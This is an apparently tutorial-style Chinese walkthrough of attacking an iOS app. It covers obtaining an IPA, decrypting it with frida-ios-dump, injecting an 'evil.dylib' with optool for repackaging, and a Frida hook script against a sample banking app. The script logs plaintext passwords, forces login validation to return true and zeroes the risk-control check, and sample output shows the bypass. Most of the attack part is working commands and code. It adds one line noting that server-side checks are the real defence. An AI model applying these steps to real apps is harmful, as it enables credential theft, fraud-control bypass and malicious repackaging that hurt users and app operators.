📦 拿到目标 IPA Target Artifact 起点

IPA 本质就是一个 ZIP 压缩包，里面装着 Mach-O 可执行文件、资源、配置与签名。 攻击的第一步不是敲命令，而是搞清楚这个包从哪来 —— 不同分发渠道决定了你要不要先脱壳。
📥 输入App Store / 企业签 / TestFlight / 第三方市场 拿到的 .ipa
📤 输出一个待分析的二进制 + 一份初步攻击面假设
攻击起点# 三种拿到 IPA 的途径，攻击难度依次递减 ① App Store 包 → 已加密（cryptid=1），必须先脱壳 ② 企业签/TestFlight → 通常未加密，可直接静态分析 ③ 第三方市场/越狱源 → 可能已被他人投毒，注意反被钓鱼
⬇️ 选定目标 · 查看包结构 ⬇️
包结构$ ls -lh TargetApp.ipa -rw-r--r-- 1 hacker staff 12M TargetApp.ipa $ unzip -l TargetApp.ipa | head -5 Payload/TargetApp.app/ Payload/TargetApp.app/TargetApp ← Mach-O 主程序 Payload/TargetApp.app/Info.plist Payload/TargetApp.app/Assets.car ← 资源（含隐藏资源）
IPA = ZIP，改后缀即可解压，核心资产在 Payload/*.app/ App Store 版本默认加密，不脱壳只能看到字符串表和配置 unzip -l TargetApp.ipa

🔓 脱壳解密 Decryption / Dump ② 静态分析

整个静态分析的前置条件。App Store 的 Mach-O 在启动时由内核解密到内存。 用 Frida 附着到运行中的进程，把内存里已解密的 __TEXT 段 dump 出来，并把 cryptid 改回 0。
📥 输入加密 Mach-O（cryptid = 1）
📤 输出解密 Mach-O（cryptid = 0）→ TargetApp.decrypted
终端# 方案 A：frida-ios-dump（推荐，自动修 cryptid） $ frida-ios-dump -u <UDID> com.example.bankwallet # -l 可先列出设备 [*] Connecting to TargetApp (pid 1337) [*] Dumping 1 modules: TargetApp [+] Dumped to TargetApp.decrypted (11.8 MB) # 方案 B：bagbak / Clutch（老工具，兼容旧系统） $ bagbak com.example.bankwallet
⬇️ 验证脱壳结果 ⬇️
验证$ otool -l TargetApp.decrypted | grep cryptid cryptid 0 ← 脱壳完成，可以反编译了
Apple 加密只保护 __TEXT，其余段（字符串、资源）无需脱壳即可读 需越狱设备；无越狱时只能走 Frida 内存 dump，且 App 有反调试会更麻烦 otool -l TargetApp.decrypted | grep cryptid

💉 注入 Gadget / 恶意 dylib Dylib Injection ③ 重打包

把 FridaGadget.dylib 或自制 dylib 插进 Mach-O 的 LC_LOAD_DYLIB， 让 App 自带插桩能力，无需越狱即可注入。 这一步同时也是投毒攻击的核心手法（见 5a）。

📤 输出已注入 dylib 的 Mach-O（原签名已失效）

⬇️ 备选注入手法 ⬇️
其他方案# 方案 B：optool（可指定偏移，更可控） $ optool install -c load -p @executable_path/evil.dylib \ -t Payload/TargetApp.app/TargetApp Found LOAD_DYLIB at offset 0x4A28 # 方案 C：不越狱时，用 Sideloadly / TrollStore 侧载注入 $ python3 frida-gadget-config.py --mode listen --port 27042

Hook 业务

🪝 Hook 关键业务方法 Method Hooking ④ 动态分析

用 Frida 拦截登录校验、风控判断、支付金额、加解密等关键方法， 读参数、改返回值。客户端的一切校验在这一步都失效。
📥 输入方法签名清单（来自 2b / 4a）
📤 输出明文参数（密码/Token）+ 被篡改的返回值
hook.jsconst Login = ObjC.classes.LoginManager; Interceptor.attach(Login['- validatePassword:'].implementation, { onEnter(args) { // args[0]=self, args[1]=SEL, args[2]=第一个参数 console.log('[+] 明文密码: ' + new ObjC.Object(args[2]).toString()); }, onLeave(ret) { ret.replace(ptr(1)); // 强制返回 true console.log('[+] 校验已改写成 true'); } }); // 也可直接替换实现，跳过整个函数体 const Risk = ObjC.classes.RiskControl; Risk['- evaluateRisk:'].implementation = ObjC.implement( Risk['- evaluateRisk:'], (self, sel, ctx) => 0); // 0 = 无风险
⬇️ 运行 Hook，看返回值被改写 ⬇️
运行结果$ frida -U -f com.example.bankwallet -l hook.js [+] 明文密码: P@ssw0rd2024! [+] 校验已改写成 true [+] RiskControl.evaluateRisk → 0 （风控被完全绕过）
Hook 返回值 = 绕过任意客户端校验（登录、风控、License、次数限制） 只改客户端没有意义 —— 服务端二次校验才是真防线，评分时要区分 frida -U -f com.example.bankwallet -l hook.js
